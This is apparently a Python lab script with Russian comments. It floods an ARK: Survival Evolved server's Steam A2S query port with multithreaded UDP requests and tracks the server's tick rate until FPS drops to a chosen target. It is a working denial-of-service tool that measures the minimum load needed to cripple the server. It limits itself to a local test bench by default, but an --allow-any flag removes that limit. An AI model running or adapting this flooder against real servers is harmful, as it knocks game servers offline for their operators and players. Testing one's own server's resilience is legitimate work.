# -*- coding: utf-8 -*-
"""
ark_lab_a2s_hunt.py — охота за минимальным числом A2S-запросов, роняющих FPS
сервера ARK SE.

Ключевой факт (измерено): обработка Steam-query выполняется В ГЕЙМ-ТРЕДЕ
сервера - latency ответа на один запрос стабильно ~50 мс, что равно периоду
тика 30 Гц. Значит каждый A2S-запрос - это работа в тике:

  * A2S_GETCHALLENGE ('T' + "Source Engine Query\\0") -> ответ 9 Б (дешёвый);
  * A2S_PLAYER_RULES  ('V' + challenge)             -> ответ 446 Б, 21 правило
    (сервер строит и форматирует 21 строку) - самый дорогой;
  * A2S_PLAYER       ('U' + challenge)             -> ответ ~10 Б.

Инструмент держит пул параллельных сокетов (каждый ждёт свой ответ ~50 мс),
поэтому темп = размер_пула / 0.05 с, и следит за FPS, останавливаясь на
целевом значении.

Только локальный стенд.
"""
from __future__ import annotations

import argparse
import os
import socket
import struct
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ark_lab_metrics import NetGuardClient, MetricsError  # noqa: E402
from ark_lab_net import guard_target, LabTargetError, pick_pid, ProcessMeter  # noqa: E402

for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, OSError):
        pass

HEADER = b"\xff\xff\xff\xff"
REQ_CHALLENGE = b"\x54Source Engine Query\x00"   # 'T'
REQ_RULES = b"\x56"                                # 'V'
REQ_PLAYER = b"\x55"                               # 'U'


class A2SPool:
    """Пул UDP-сокетов; каждый держит свою "сессию" (свой challenge)."""

    def __init__(self, host: str, port: int, size: int, kind: str):
        self.host = host
        self.port = port
        self.size = size
        self.kind = kind
        self.socks: list[socket.socket] = []
        self.challenges: list[bytes] = []
        self.sent = 0
        self.replies = 0
        self.errors = 0
        self._lock = threading.Lock()
        self._next = 0

    def _new_sock(self) -> None:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1.0)
        try:
            s.bind(("0.0.0.0", 0))
        except OSError:
            pass
        self.socks.append(s)
        self.challenges.append(b"")

    def _get(self) -> int:
        with self._lock:
            if len(self.socks) < self.size:
                self._new_sock()
            idx = self._next % len(self.socks)
            self._next += 1
            return idx

    def request(self) -> bool:
        """Один запрос (с получением ответа). Возвращает True при успехе."""
        idx = self._get()
        s = self.socks[idx]
        ch = self.challenges[idx]
        try:
            if self.kind == "rules" or self.kind == "player":
                if not ch:
                    s.sendto(HEADER + REQ_CHALLENGE, (self.host, self.port))
                    data = s.recv(4096)
                    if len(data) < 9 or data[4] != 0x41:
                        return False
                    ch = data[5:9]
                    self.challenges[idx] = ch
                req = REQ_RULES if self.kind == "rules" else REQ_PLAYER
                s.sendto(HEADER + req + ch, (self.host, self.port))
            else:
                s.sendto(HEADER + REQ_CHALLENGE, (self.host, self.port))
            s.recv(65535)
            with self._lock:
                self.sent += 1
                self.replies += 1
            return True
        except (socket.timeout, OSError):
            with self._lock:
                self.sent += 1
                self.errors += 1
            return False

    def close(self) -> None:
        for s in self.socks:
            try:
                s.close()
            except OSError:
                pass
        self.socks.clear()


def hunt(args) -> dict:
    pool = A2SPool(args.host, args.query_port, args.pool, args.kind)
    m = NetGuardClient("127.0.0.1", args.metrics_port).connect()
    pid = pick_pid("ShooterGameServer.exe", args.server_filter)
    meter = ProcessMeter(pid)

    def status():
        s = m.status()
        return (float(s.get("tps", 0.0) or 0.0), float(s.get("tickMs", 0.0) or 0.0),
                int(s.get("memKB", 0) or 0))

    tps0, tick0, mem0 = status()
    print("=" * 78)
    print("A2S-охота: kind=%s, пул=%d сокетов, цель FPS<=%d, лимит %d с"
          % (args.kind, args.pool, args.target_fps, args.max_seconds))
    print("=" * 78)
    print("  фон: tps=%.1f tick=%.2f ms mem=%d МБ" % (tps0, tick0, mem0 // 1024))

    stop = threading.Event()

    def worker() -> None:
        while not stop.is_set():
            pool.request()
            if args.rate:
                time.sleep(1.0 / args.rate)

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(args.threads)]
    for t in threads:
        t.start()

    curve = []
    hit = None
    cpu0 = meter.sample()
    t_start = time.time()
    while time.time() - t_start < args.max_seconds:
        time.sleep(args.sample_interval)
        tps, tick, mem = status()
        el = time.time() - t_start
        n = pool.sent
        curve.append((el, n, tps, tick))
        print("  t+%5.1fs  запросов %7d (%6.0f pps)  ответов %7d  tps %5.1f  tick %7.2f ms  mem %5d МБ"
              % (el, n, n / max(1.0, el), pool.replies, tps, tick, mem // 1024))
        if 0 < tps <= args.target_fps:
            hit = (el, n, tps)
            break
    stop.set()
    for t in threads:
        t.join(timeout=2.0)
    cpu1 = meter.sample()
    dt = cpu1["t"] - cpu0["t"]
    cpu_pct = ((cpu1["cpu"] - cpu0["cpu"]) / dt * 100.0) if dt > 0 else 0.0
    tps_end, tick_end, mem_end = status()
    pool.close()
    m.close()

    print("\n  ИТОГО: запросов %d (ответов %d, ошибок %d) за %.1f с = %.0f pps, CPU %.1f%%"
          % (pool.sent, pool.replies, pool.errors, time.time() - t_start,
             pool.sent / max(1.0, time.time() - t_start), cpu_pct))
    print("  tps %.1f -> %.1f   tick %.2f -> %.2f ms   mem %d -> %d МБ"
          % (tps0, tps_end, tick0, tick_end, mem0 // 1024, mem_end // 1024))
    if hit:
        print("  >>> ЦЕЛЬ ДОСТИГНУТА: tps<=%.0f после %d запросов (%.1f с)"
              % (args.target_fps, hit[1], hit[0]))
    else:
        print("  >>> ЦЕЛЬ НЕ ДОСТИГНУТА; минимальный tps за окно = %.1f"
              % (min(c[2] for c in curve) if curve else 0.0))
    return {"sent": pool.sent, "tps0": tps0, "tps_end": tps_end, "tick0": tick0,
            "tick_end": tick_end, "cpu_pct": cpu_pct, "hit": bool(hit),
            "hit_packets": hit[1] if hit else 0, "curve": curve}


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="Поиск минимального числа A2S-запросов для падения FPS")
    ap.add_argument("--host", default="192.168.8.218")
    ap.add_argument("--query-port", type=int, default=27016)
    ap.add_argument("--kind", choices=["challenge", "rules", "player"], default="rules")
    ap.add_argument("--pool", type=int, default=64, help="размер пула сокетов")
    ap.add_argument("--threads", type=int, default=16)
    ap.add_argument("--rate", type=int, default=0, help="макс. pps на поток (0 = без ограничения)")
    ap.add_argument("--target-fps", type=float, default=3.0)
    ap.add_argument("--max-seconds", type=float, default=120.0)
    ap.add_argument("--sample-interval", type=float, default=1.0)
    ap.add_argument("--metrics-port", type=int, default=27101)
    ap.add_argument("--server-filter", default="Server2")
    ap.add_argument("--allow-any", action="store_true")
    args = ap.parse_args(argv)

    try:
        guard_target(args.host, args.allow_any)
    except LabTargetError as exc:
        print("[!] %s" % (exc,))
        return 2

    try:
        hunt(args)
    except KeyboardInterrupt:
        print("\n[!] прервано")
    return 0


if __name__ == "__main__":
    sys.exit(main())
